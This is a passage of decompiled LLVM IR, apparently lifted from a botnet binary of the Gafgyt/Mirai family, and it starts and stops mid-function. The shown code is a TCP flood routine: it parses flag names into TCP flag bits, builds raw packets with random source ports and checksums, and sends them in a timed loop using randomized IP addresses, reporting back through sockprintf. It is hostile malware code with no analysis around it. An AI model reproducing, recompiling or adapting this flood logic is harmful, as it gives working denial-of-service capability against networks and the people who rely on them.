  %v4_804b9e5 = zext i8 %v3_804b9e5 to i32
  %v5_804b9e5 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9e5 = and i32 %v5_804b9e5, -256
  %v7_804b9e5 = or i32 %v4_804b9e5, %v6_804b9e5
  %v1_804b9e8 = or i32 %v7_804b9e5, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9e8 = trunc i32 %v1_804b9e8 to i8
  store i32 %v1_804b9e8, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9e8, i8* %v2_804b9c1, align 1
  store i32 %v1_804b91a, i32* %edx.global-to-local, align 4
  %v3_804b9f1 = load i8, i8* %v2_804b9c1, align 1
  %v4_804b9f1 = zext i8 %v3_804b9f1 to i32
  %v5_804b9f1 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9f1 = and i32 %v5_804b9f1, -256
  %v7_804b9f1 = or i32 %v4_804b9f1, %v6_804b9f1
  %v1_804b9f4 = or i32 %v7_804b9f1, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9f4 = trunc i32 %v1_804b9f4 to i8
  store i32 %v1_804b9f4, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9f4, i8* %v2_804b9c1, align 1
  %v0_804bbcb.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804bbcb

dec_label_pc_804b9ff:                             ; preds = %dec_label_pc_804b8df
  store i32 %v4_804b98b, i32* @eax, align 4
  %v0_804ba02 = load i32, i32* @esp, align 4
  %v5_804ba02 = icmp ult i32 %v0_804ba02, 8
  store i1 %v5_804ba02, i1* %cf.global-to-local, align 1
  %v1_804ba05 = add i32 %v0_804ba02, -12
  %v2_804ba05 = inttoptr i32 %v1_804ba05 to i32*
  store i32 ptrtoint (i32* @global_var_80529d4.47 to i32), i32* %v2_804ba05, align 4
  %v0_804ba0a = load i32, i32* @eax, align 4
  %v2_804ba0a = add i32 %v0_804ba02, -16
  %v3_804ba0a = inttoptr i32 %v2_804ba0a to i32*
  store i32 %v0_804ba0a, i32* %v3_804ba0a, align 4
  %v3_804ba0b = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80529d0.46 to i32))
  store i32 %v3_804ba0b, i32* %eax.global-to-local, align 4
  %v5_804ba13 = inttoptr i32 %v3_804ba0b to i8*
  store i8* %v5_804ba13, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bbc121 = icmp eq i32 %v3_804ba0b, 0
  %v1_804bbc528 = icmp eq i1 %v5_804bbc121, false
  br i1 %v1_804bbc528, label %dec_label_pc_804ba1b.lr.ph, label %dec_label_pc_804bbcb

dec_label_pc_804ba1b.lr.ph:                       ; preds = %dec_label_pc_804b9ff
  %v1_804bb88 = add i32 %v2_804b902, 33
  %v2_804bb88 = inttoptr i32 %v1_804bb88 to i8*
  %tmp103 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804ba1b

dec_label_pc_804ba1b:                             ; preds = %dec_label_pc_804ba1b.lr.ph, %dec_label_pc_804bbac
  %v3_804bb9b = phi i8* [ %v5_804ba13, %dec_label_pc_804ba1b.lr.ph ], [ %tmp104, %dec_label_pc_804bbac ]
  %stack_var_-156.130 = phi i8* [ %tmp49, %dec_label_pc_804ba1b.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804bbac ]
  %stack_var_-160.129 = phi i32 [ %tmp48, %dec_label_pc_804ba1b.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804bbac ]
  %v4_804ba1b = ptrtoint i8* %v3_804bb9b to i32
  store i32 %v4_804ba1b, i32* %eax.global-to-local, align 4
  store i32 %v4_804ba1b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80529d6.48 to i32), i32* @edi, align 4
  %v6_804ba39 = call i32 @_strncmp(i8* %v3_804bb9b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529d6.48, i32 0, i32 0), i32 4)
  %v7_804ba39 = urem i32 %v6_804ba39, 2
  %v8_804ba39 = icmp eq i32 %v7_804ba39, 0
  %v0_804ba3b = load i1, i1* %cf.global-to-local, align 1
  %v2_804ba3b = or i1 %v0_804ba3b, %v8_804ba39
  %v3_804ba3b = zext i1 %v2_804ba3b to i32
  %v4_804ba3b = load i32, i32* @edx, align 4
  %v5_804ba3b = and i32 %v4_804ba3b, -256
  %v6_804ba3b = or i32 %v3_804ba3b, %v5_804ba3b
  %v7_804ba3b = xor i32 %v6_804ba3b, 1
  store i32 %v7_804ba3b, i32* %edx.global-to-local, align 4
  %v3_804ba41 = and i32 %v6_804ba39, -256
  %v1_804ba43 = trunc i32 %v7_804ba3b to i8
  %v3_804ba43 = zext i1 %v0_804ba3b to i8
  %v4_804ba43 = sub nsw i8 %v1_804ba43, %v3_804ba43
  %v15_804ba43 = icmp eq i8 %v4_804ba43, 0
  %v20_804ba43 = zext i8 %v4_804ba43 to i32
  %v23_804ba43 = or i32 %v20_804ba43, %v3_804ba41
  store i32 %v23_804ba43, i32* @ecx, align 4
  %v2_804ba47 = sext i8 %v4_804ba43 to i32
  store i32 %v2_804ba47, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ba4c = icmp eq i1 %v15_804ba43, false
  br i1 %v1_804ba4c, label %dec_label_pc_804ba5f, label %dec_label_pc_804ba4e

dec_label_pc_804ba4e:                             ; preds = %dec_label_pc_804ba1b
  store i32 %v1_804b91a, i32* @eax, align 4
  %v3_804ba51 = load i8, i8* %v2_804bb88, align 1
  %v4_804ba51 = zext i8 %v3_804ba51 to i32
  %v7_804ba51 = or i32 %v5_804ba3b, %v4_804ba51
  %v1_804ba54 = or i32 %v7_804ba51, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba54 = trunc i32 %v1_804ba54 to i8
  store i32 %v1_804ba54, i32* @edx, align 4
  store i8 %v3_804ba54, i8* %v2_804bb88, align 1
  br label %dec_label_pc_804bbac

dec_label_pc_804ba5f:                             ; preds = %dec_label_pc_804ba1b
  store i32 %v4_804ba1b, i32* %eax.global-to-local, align 4
  store i32 %v4_804ba1b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80529da.49 to i32), i32* @edi, align 4
  %v6_804ba7d = call i32 @_strncmp(i8* %v3_804bb9b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529da.49, i32 0, i32 0), i32 4)
  %v7_804ba7d = urem i32 %v6_804ba7d, 2
  %v8_804ba7d = icmp eq i32 %v7_804ba7d, 0
  %v0_804ba7f = load i1, i1* %cf.global-to-local, align 1
  %v2_804ba7f = or i1 %v0_804ba7f, %v8_804ba7d
  %v3_804ba7f = zext i1 %v2_804ba7f to i32
  %v4_804ba7f = load i32, i32* %edx.global-to-local, align 4
  %v5_804ba7f = and i32 %v4_804ba7f, -256
  %v6_804ba7f = or i32 %v3_804ba7f, %v5_804ba7f
  %v7_804ba7f = xor i32 %v6_804ba7f, 1
  store i32 %v7_804ba7f, i32* %edx.global-to-local, align 4
  %v3_804ba85 = and i32 %v6_804ba7d, -256
  %v1_804ba87 = trunc i32 %v7_804ba7f to i8
  %v3_804ba87 = zext i1 %v0_804ba7f to i8
  %v4_804ba87 = sub nsw i8 %v1_804ba87, %v3_804ba87
  %v15_804ba87 = icmp eq i8 %v4_804ba87, 0
  %v20_804ba87 = zext i8 %v4_804ba87 to i32
  %v23_804ba87 = or i32 %v20_804ba87, %v3_804ba85
  store i32 %v23_804ba87, i32* @ecx, align 4
  %v2_804ba8b = sext i8 %v4_804ba87 to i32
  store i32 %v2_804ba8b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ba90 = icmp eq i1 %v15_804ba87, false
  br i1 %v1_804ba90, label %dec_label_pc_804baa3, label %dec_label_pc_804ba92

dec_label_pc_804ba92:                             ; preds = %dec_label_pc_804ba5f
  store i32 %v1_804b91a, i32* @eax, align 4
  %v3_804ba95 = load i8, i8* %v2_804bb88, align 1
  %v4_804ba95 = zext i8 %v3_804ba95 to i32
  %v7_804ba95 = or i32 %v5_804ba7f, %v4_804ba95
  %v1_804ba98 = or i32 %v7_804ba95, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba98 = trunc i32 %v1_804ba98 to i8
  store i32 %v1_804ba98, i32* @edx, align 4
  store i8 %v3_804ba98, i8* %v2_804bb88, align 1
  br label %dec_label_pc_804bbac

dec_label_pc_804baa3:                             ; preds = %dec_label_pc_804ba5f
  store i32 %v4_804ba1b, i32* %eax.global-to-local, align 4
  store i32 %v4_804ba1b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80529de.50 to i32), i32* @edi, align 4
  %v6_804bac7 = call i32 @_strncmp(i8* %v3_804bb9b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529de.50, i32 0, i32 0), i32 4)
  %v7_804bac7 = urem i32 %v6_804bac7, 2
  %v8_804bac7 = icmp eq i32 %v7_804bac7, 0
  %v0_804bac9 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bac9 = or i1 %v0_804bac9, %v8_804bac7
  %v3_804bac9 = zext i1 %v2_804bac9 to i32
  %v4_804bac9 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bac9 = and i32 %v4_804bac9, -256
  %v6_804bac9 = or i32 %v3_804bac9, %v5_804bac9
  %v7_804bac9 = xor i32 %v6_804bac9, 1
  store i32 %v7_804bac9, i32* %edx.global-to-local, align 4
  %v3_804bacf = and i32 %v6_804bac7, -256
  %v1_804bad1 = trunc i32 %v7_804bac9 to i8
  %v3_804bad1 = zext i1 %v0_804bac9 to i8
  %v4_804bad1 = sub nsw i8 %v1_804bad1, %v3_804bad1
  %v15_804bad1 = icmp eq i8 %v4_804bad1, 0
  %v20_804bad1 = zext i8 %v4_804bad1 to i32
  %v23_804bad1 = or i32 %v20_804bad1, %v3_804bacf
  store i32 %v23_804bad1, i32* @ecx, align 4
  %v2_804bad5 = sext i8 %v4_804bad1 to i32
  store i32 %v2_804bad5, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bada = icmp eq i1 %v15_804bad1, false
  br i1 %v1_804bada, label %dec_label_pc_804baed, label %dec_label_pc_804badc

dec_label_pc_804badc:                             ; preds = %dec_label_pc_804baa3
  store i32 %v1_804b91a, i32* @eax, align 4
  %v3_804badf = load i8, i8* %v2_804bb88, align 1
  %v4_804badf = zext i8 %v3_804badf to i32
  %v7_804badf = or i32 %v5_804bac9, %v4_804badf
  %v1_804bae2 = or i32 %v7_804badf, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bae2 = trunc i32 %v1_804bae2 to i8
  store i32 %v1_804bae2, i32* @edx, align 4
  store i8 %v3_804bae2, i8* %v2_804bb88, align 1
  br label %dec_label_pc_804bbac

dec_label_pc_804baed:                             ; preds = %dec_label_pc_804baa3
  store i32 %v4_804ba1b, i32* %eax.global-to-local, align 4
  store i32 %v4_804ba1b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80529e2.51 to i32), i32* @edi, align 4
  %v6_804bb1d = call i32 @_strncmp(i8* %v3_804bb9b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529e2.51, i32 0, i32 0), i32 4)
  %v7_804bb1d = urem i32 %v6_804bb1d, 2
  %v8_804bb1d = icmp eq i32 %v7_804bb1d, 0
  %v0_804bb1f = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb1f = or i1 %v0_804bb1f, %v8_804bb1d
  %v3_804bb1f = zext i1 %v2_804bb1f to i32
  %v4_804bb1f = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb1f = and i32 %v4_804bb1f, -256
  %v6_804bb1f = or i32 %v3_804bb1f, %v5_804bb1f
  %v7_804bb1f = xor i32 %v6_804bb1f, 1
  store i32 %v7_804bb1f, i32* %edx.global-to-local, align 4
  %v3_804bb25 = and i32 %v6_804bb1d, -256
  %v1_804bb27 = trunc i32 %v7_804bb1f to i8
  %v3_804bb27 = zext i1 %v0_804bb1f to i8
  %v4_804bb27 = sub nsw i8 %v1_804bb27, %v3_804bb27
  %v15_804bb27 = icmp eq i8 %v4_804bb27, 0
  %v20_804bb27 = zext i8 %v4_804bb27 to i32
  %v23_804bb27 = or i32 %v20_804bb27, %v3_804bb25
  store i32 %v23_804bb27, i32* @ecx, align 4
  %v2_804bb2b = sext i8 %v4_804bb27 to i32
  store i32 %v2_804bb2b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb30 = icmp eq i1 %v15_804bb27, false
  br i1 %v1_804bb30, label %dec_label_pc_804bb40, label %dec_label_pc_804bb32

dec_label_pc_804bb32:                             ; preds = %dec_label_pc_804baed
  store i32 %v1_804b91a, i32* @eax, align 4
  %v3_804bb35 = load i8, i8* %v2_804bb88, align 1
  %v4_804bb35 = zext i8 %v3_804bb35 to i32
  %v7_804bb35 = or i32 %v5_804bb1f, %v4_804bb35
  %v1_804bb38 = or i32 %v7_804bb35, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb38 = trunc i32 %v1_804bb38 to i8
  store i32 %v1_804bb38, i32* @edx, align 4
  store i8 %v3_804bb38, i8* %v2_804bb88, align 1
  br label %dec_label_pc_804bbac

dec_label_pc_804bb40:                             ; preds = %dec_label_pc_804baed
  store i32 %v4_804ba1b, i32* %eax.global-to-local, align 4
  store i32 %v4_804ba1b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80529e6.52 to i32), i32* @edi, align 4
  %v6_804bb70 = call i32 @_strncmp(i8* %v3_804bb9b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529e6.52, i32 0, i32 0), i32 4)
  %v7_804bb70 = urem i32 %v6_804bb70, 2
  %v8_804bb70 = icmp eq i32 %v7_804bb70, 0
  %v0_804bb72 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb72 = or i1 %v0_804bb72, %v8_804bb70
  %v3_804bb72 = zext i1 %v2_804bb72 to i32
  %v4_804bb72 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb72 = and i32 %v4_804bb72, -256
  %v6_804bb72 = or i32 %v3_804bb72, %v5_804bb72
  %v7_804bb72 = xor i32 %v6_804bb72, 1
  store i32 %v7_804bb72, i32* %edx.global-to-local, align 4
  %v3_804bb78 = and i32 %v6_804bb70, -256
  %v1_804bb7a = trunc i32 %v7_804bb72 to i8
  %v3_804bb7a = zext i1 %v0_804bb72 to i8
  %v4_804bb7a = sub nsw i8 %v1_804bb7a, %v3_804bb7a
  %v15_804bb7a = icmp eq i8 %v4_804bb7a, 0
  %v20_804bb7a = zext i8 %v4_804bb7a to i32
  %v23_804bb7a = or i32 %v20_804bb7a, %v3_804bb78
  store i32 %v23_804bb7a, i32* @ecx, align 4
  %v2_804bb7e = sext i8 %v4_804bb7a to i32
  store i32 %v2_804bb7e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb83 = icmp eq i1 %v15_804bb7a, false
  br i1 %v1_804bb83, label %dec_label_pc_804bb93, label %dec_label_pc_804bb85

dec_label_pc_804bb85:                             ; preds = %dec_label_pc_804bb40
  store i32 %v1_804b91a, i32* @eax, align 4
  %v3_804bb88 = load i8, i8* %v2_804bb88, align 1
  %v4_804bb88 = zext i8 %v3_804bb88 to i32
  %v7_804bb88 = or i32 %v5_804bb72, %v4_804bb88
  %v1_804bb8b = or i32 %v7_804bb88, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb8b = trunc i32 %v1_804bb8b to i8
  store i32 %v1_804bb8b, i32* @edx, align 4
  store i8 %v3_804bb8b, i8* %v2_804bb88, align 1
  br label %dec_label_pc_804bbac

dec_label_pc_804bb93:                             ; preds = %dec_label_pc_804bb40
  %v0_804bb93 = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804bb93, i32* %eax.global-to-local, align 4
  %v0_804bb98 = load i32, i32* @esp, align 4
  %v5_804bb98 = icmp ult i32 %v0_804bb98, 4
  store i1 %v5_804bb98, i1* %cf.global-to-local, align 1
  %v6_804bb9b = add i32 %v0_804bb98, -8
  %v7_804bb9b = inttoptr i32 %v6_804bb9b to i32*
  store i32 %v4_804ba1b, i32* %v7_804bb9b, align 4
  %v1_804bb9e = add i32 %v0_804bb98, -12
  %v2_804bb9e = inttoptr i32 %v1_804bb9e to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_80529ea.53 to i32), i32* %v2_804bb9e, align 4
  %v0_804bba3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bba3 = add i32 %v0_804bb98, -16
  %v3_804bba3 = inttoptr i32 %v2_804bba3 to i32*
  store i32 %v0_804bba3, i32* %v3_804bba3, align 4
  %v3_804bba4 = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80529e6.52 to i32))
  store i32 %v3_804bba4, i32* @eax, align 4
  %v0_804bba9 = load i32, i32* @esp, align 4
  %v2_804bba9 = icmp ugt i32 %v0_804bba9, -17
  store i1 %v2_804bba9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bbac

dec_label_pc_804bbac:                             ; preds = %dec_label_pc_804bb85, %dec_label_pc_804bb32, %dec_label_pc_804badc, %dec_label_pc_804ba92, %dec_label_pc_804ba4e, %dec_label_pc_804bb93
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804bb93 ], [ 4, %dec_label_pc_804bb85 ], [ %stack_var_-160.129, %dec_label_pc_804bb32 ], [ %stack_var_-160.129, %dec_label_pc_804badc ], [ %stack_var_-160.129, %dec_label_pc_804ba92 ], [ %stack_var_-160.129, %dec_label_pc_804ba4e ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529e6.52, i32 0, i32 0), %dec_label_pc_804bb93 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80529e6.52, i32 0, i32 0), %dec_label_pc_804bb85 ], [ %stack_var_-156.130, %dec_label_pc_804bb32 ], [ %stack_var_-156.130, %dec_label_pc_804badc ], [ %stack_var_-156.130, %dec_label_pc_804ba92 ], [ %stack_var_-156.130, %dec_label_pc_804ba4e ]
  %v0_804bbac = load i32, i32* @esp, align 4
  %v5_804bbac = icmp ult i32 %v0_804bbac, 8
  store i1 %v5_804bbac, i1* %cf.global-to-local, align 1
  %v1_804bbaf = add i32 %v0_804bbac, -12
  %v2_804bbaf = inttoptr i32 %v1_804bbaf to i32*
  store i32 ptrtoint (i32* @global_var_80529d4.47 to i32), i32* %v2_804bbaf, align 4
  %v1_804bbb4 = add i32 %v0_804bbac, -16
  %v2_804bbb4 = inttoptr i32 %v1_804bbb4 to i32*
  store i32 0, i32* %v2_804bbb4, align 4
  %v2_804bbb6 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804bbb6 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804bbb6)
  store i32 %v3_804bbb6, i32* %eax.global-to-local, align 4
  store i32 %v3_804bbb6, i32* %tmp103, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bbc1 = icmp eq i32 %v3_804bbb6, 0
  %v1_804bbc5 = icmp eq i1 %v5_804bbc1, false
  %tmp104 = inttoptr i32 %v3_804bbb6 to i8*
  br i1 %v1_804bbc5, label %dec_label_pc_804ba1b, label %dec_label_pc_804bbcb

dec_label_pc_804bbcb:                             ; preds = %dec_label_pc_804bbac, %dec_label_pc_804b9ff, %dec_label_pc_804b9be
  %v0_804bbcb = phi i8* [ %v0_804bbcb.pre, %dec_label_pc_804b9be ], [ %v5_804ba13, %dec_label_pc_804b9ff ], [ %tmp104, %dec_label_pc_804bbac ]
  %v1_804bbcb = ptrtoint i8* %v0_804bbcb to i32
  %v2_804bbcb = call i32 @rand_cmwc(i32 %v1_804bbcb)
  %sext8 = mul i32 %v2_804bbcb, 65536
  %v1_804bbd0 = sdiv i32 %sext8, 65536
  store i32 %v1_804bbd0, i32* %edx.global-to-local, align 4
  %v1_804bbd5 = trunc i32 %v1_804bbd0 to i16
  %v3_804bbd5 = add i32 %v2_804b902, 34
  %v4_804bbd5 = inttoptr i32 %v3_804bbd5 to i16*
  store i16 %v1_804bbd5, i16* %v4_804bbd5, align 2
  %v1_804bbdc = add i32 %v2_804b902, 36
  %v2_804bbdc = inttoptr i32 %v1_804bbdc to i16*
  store i16 0, i16* %v2_804bbdc, align 4
  store i32 %v1_804b91a, i32* %eax.global-to-local, align 4
  %v1_804bbe5 = add i32 %v2_804b902, 38
  %v2_804bbe5 = inttoptr i32 %v1_804bbe5 to i16*
  store i16 0, i16* %v2_804bbe5, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804b81d, label %dec_label_pc_804bbfc, label %dec_label_pc_804bbf1

dec_label_pc_804bbf1:                             ; preds = %dec_label_pc_804bbcb
  %v0_804bbf1 = load i8*, i8** %stack_var_-20, align 4
  %v1_804bbf1 = ptrtoint i8* %v0_804bbf1 to i32
  %v2_804bbf1 = call i32 @rand_cmwc(i32 %v1_804bbf1)
  store i32 %v2_804bbf1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc14

dec_label_pc_804bbfc:                             ; preds = %dec_label_pc_804bbcb
  %v1_804bbff = urem i32 %arg2, 65536
  store i32 %v1_804bbff, i32* %eax.global-to-local, align 4
  %v0_804bc04 = load i32, i32* @esp, align 4
  %v5_804bc04 = icmp ult i32 %v0_804bc04, 12
  store i1 %v5_804bc04, i1* %cf.global-to-local, align 1
  %v2_804bc07 = add i32 %v0_804bc04, -16
  %v3_804bc07 = inttoptr i32 %v2_804bc07 to i32*
  store i32 %v1_804bbff, i32* %v3_804bc07, align 4
  %v1_804bc08 = sext i16 %tmp47 to i32
  %v2_804bc08 = call i32 @htons(i32 %v1_804bc08)
  store i32 %v2_804bc08, i32* %eax.global-to-local, align 4
  %v0_804bc0d = load i32, i32* @esp, align 4
  %v2_804bc0d = icmp ugt i32 %v0_804bc0d, -17
  store i1 %v2_804bc0d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bc14

dec_label_pc_804bc14:                             ; preds = %dec_label_pc_804bbf1, %dec_label_pc_804bbfc
  %storemerge.in = phi i32 [ %v2_804bc08, %dec_label_pc_804bbfc ], [ %v2_804bbf1, %dec_label_pc_804bbf1 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b91a, i32* %eax.global-to-local, align 4
  %v4_804bc17 = urem i32 %storemerge.in, 65536
  %v5_804bc17 = load i32, i32* @esi, align 4
  %v6_804bc17 = and i32 %v5_804bc17, -65536
  %v7_804bc17 = or i32 %v6_804bc17, %v4_804bc17
  store i32 %v7_804bc17, i32* @esi, align 4
  %v3_804bc1b = add i32 %v2_804b902, 22
  %v4_804bc1b = inttoptr i32 %v3_804bc1b to i16*
  store i16 %storemerge, i16* %v4_804bc1b, align 2
  %v0_804bc1f = load i32, i32* @esp, align 4
  %v5_804bc1f = icmp ult i32 %v0_804bc1f, 8
  store i1 %v5_804bc1f, i1* %cf.global-to-local, align 1
  %v6_804bc22 = add i32 %v0_804bc1f, -12
  %v7_804bc22 = inttoptr i32 %v6_804bc22 to i32*
  store i32 %v1_804b91a, i32* %v7_804bc22, align 4
  %v5_804bc25 = add i32 %v0_804bc1f, -16
  %v6_804bc25 = inttoptr i32 %v5_804bc25 to i32*
  store i32 %v2_804b902, i32* %v6_804bc25, align 4
  %v0_804bc28 = call i32 @tcpcsum()
  %v1_804bc28 = trunc i32 %v0_804bc28 to i16
  %sext13 = mul i32 %v0_804bc28, 65536
  %v1_804bc30 = sdiv i32 %sext13, 65536
  store i32 %v1_804bc30, i32* %edx.global-to-local, align 4
  store i16 %v1_804bc28, i16* %v2_804bbdc, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  %v1_804bc3c = or i32 %v2_804b902, 2
  %v2_804bc3c = inttoptr i32 %v1_804bc3c to i16*
  %v3_804bc3c = load i16, i16* %v2_804bc3c, align 2
  %v4_804bc3c = zext i16 %v3_804bc3c to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bc3c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  %v1_804bc4b = load i32, i32* @esp, align 4
  %v2_804bc4b = add i32 %v1_804bc4b, -4
  %v3_804bc4b = inttoptr i32 %v2_804bc4b to i32*
  store i32 %v4_804bc3c, i32* %v3_804bc4b, align 4
  %v0_804bc4c = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc4c = add i32 %v1_804bc4b, -8
  %v3_804bc4c = inttoptr i32 %v2_804bc4c to i32*
  store i32 %v0_804bc4c, i32* %v3_804bc4c, align 4
  %sext14 = mul i32 %storemerge.in, 65536
  %v1_804bc4d = sdiv i32 %sext14, 65536
  %v3_804bc4d = inttoptr i32 %v1_804bc4d to i16*
  %v4_804bc4d = call i32 @csum(i16* %v3_804bc4d, i32 ptrtoint (i32* @0 to i32))
  %v5_804bc4d = trunc i32 %v4_804bc4d to i16
  %sext15 = mul i32 %v4_804bc4d, 65536
  %v1_804bc55 = sdiv i32 %sext15, 65536
  store i32 %v1_804bc55, i32* %edx.global-to-local, align 4
  store i32 %v2_804b902, i32* %eax.global-to-local, align 4
  %v3_804bc5a = or i32 %v2_804b902, 10
  %v4_804bc5a = inttoptr i32 %v3_804bc5a to i16*
  store i16 %v5_804bc4d, i16* %v4_804bc5a, align 2
  %v0_804bc5e = load i32, i32* @esp, align 4
  %v5_804bc5e = icmp ult i32 %v0_804bc5e, 12
  store i1 %v5_804bc5e, i1* %cf.global-to-local, align 1
  %v1_804bc61 = add i32 %v0_804bc5e, -16
  %v2_804bc61 = inttoptr i32 %v1_804bc61 to i32*
  store i32 0, i32* %v2_804bc61, align 4
  %v2_804bc63 = inttoptr i32 %v1_804bc4d to i32*
  %v3_804bc63 = call i32 @__GI_time(i32* %v2_804bc63)
  %v0_804bc68 = load i32, i32* @esp, align 4
  %v1_804bc68 = add i32 %v0_804bc68, 16
  %v5_804bc6b = add i32 %v3_804bc63, %arg3
  %v10_804bc6b = icmp ult i32 %v5_804bc6b, %v3_804bc63
  store i1 %v10_804bc6b, i1* %cf.global-to-local, align 1
  store i32 %v5_804bc6b, i32* %eax.global-to-local, align 4
  %v2_804bcb6 = or i32 %v2_804b902, 12
  %v3_804bcb6 = inttoptr i32 %v2_804bcb6 to i32*
  %v3_804bcc3 = or i32 %v2_804b902, 4
  %v4_804bcc3 = inttoptr i32 %v3_804bcc3 to i16*
  br label %dec_label_pc_804bc7a

dec_label_pc_804bc7a:                             ; preds = %dec_label_pc_804bd31, %dec_label_pc_804bd4f, %dec_label_pc_804bc14
  %v0_804bc80 = phi i32 [ %v1_804bc68, %dec_label_pc_804bc14 ], [ %v0_804bc80.pre.pre, %dec_label_pc_804bd4f ], [ %v1_804bd3b, %dec_label_pc_804bd31 ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804bc14 ], [ %v4_804bd4f, %dec_label_pc_804bd4f ], [ 0, %dec_label_pc_804bd31 ]
  store i32 %v2_804b845, i32* %eax.global-to-local, align 4
  store i32 %v2_804b902, i32* %edx.global-to-local, align 4
  %v5_804bc80 = icmp ult i32 %v0_804bc80, 8
  store i1 %v5_804bc80, i1* %cf.global-to-local, align 1
  %v1_804bc83 = add i32 %v0_804bc80, -12
  %v2_804bc83 = inttoptr i32 %v1_804bc83 to i32*
  store i32 16, i32* %v2_804bc83, align 4
  %v2_804bc85 = add i32 %v0_804bc80, -16
  %v3_804bc85 = inttoptr i32 %v2_804bc85 to i32*
  store i32 %v2_804b845, i32* %v3_804bc85, align 4
  %v1_804bc86 = add i32 %v0_804bc80, -20
  %v2_804bc86 = inttoptr i32 %v1_804bc86 to i32*
  store i32 0, i32* %v2_804bc86, align 4
  %v5_804bc88 = add i32 %v0_804bc80, -24
  %v6_804bc88 = inttoptr i32 %v5_804bc88 to i32*
  store i32 %v1_804b8e2, i32* %v6_804bc88, align 4
  %v0_804bc8b = load i32, i32* %edx.global-to-local, align 4
  %v2_804bc8b = add i32 %v0_804bc80, -28
  %v3_804bc8b = inttoptr i32 %v2_804bc8b to i32*
  store i32 %v0_804bc8b, i32* %v3_804bc8b, align 4
  %v5_804bc8c = add i32 %v0_804bc80, -32
  %v6_804bc8c = inttoptr i32 %v5_804bc8c to i32*
  store i32 %v3_804b87c, i32* %v6_804bc8c, align 4
  %v1_804bc8f = load i32, i32* %stack_var_-64, align 4
  %v2_804bc8f = load i32, i32* %stack_var_-60, align 4
  %v3_804bc8f = load i32, i32* %stack_var_-56, align 4
  %v4_804bc8f = load i32, i32* %stack_var_-52, align 4
  %v6_804bc8f = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804bc8f, i32 %v2_804bc8f, i32 %v3_804bc8f, i32 %v4_804bc8f, i32 0)
  store i32 %v6_804bc8f, i32* %eax.global-to-local, align 4
  %v0_804bc94 = load i32, i32* @esp, align 4
  %v1_804bc94 = add i32 %v0_804bc94, 32
  %v5_804bc97 = icmp ult i32 %v1_804bc94, 12
  store i1 %v5_804bc97, i1* %cf.global-to-local, align 1
  %v5_804bc9a = add i32 %v0_804bc94, 16
  %v6_804bc9a = inttoptr i32 %v5_804bc9a to i32*
  store i32 %storemerge12, i32* %v6_804bc9a, align 4
  %v1_804bc9d = load i32, i32* %stack_var_-64, align 4
  %v2_804bc9d = call i32 @getRandomIP(i32 %stack_var_-68.0, i32 %v1_804bc9d)
  store i32 %v2_804bc9d, i32* %eax.global-to-local, align 4
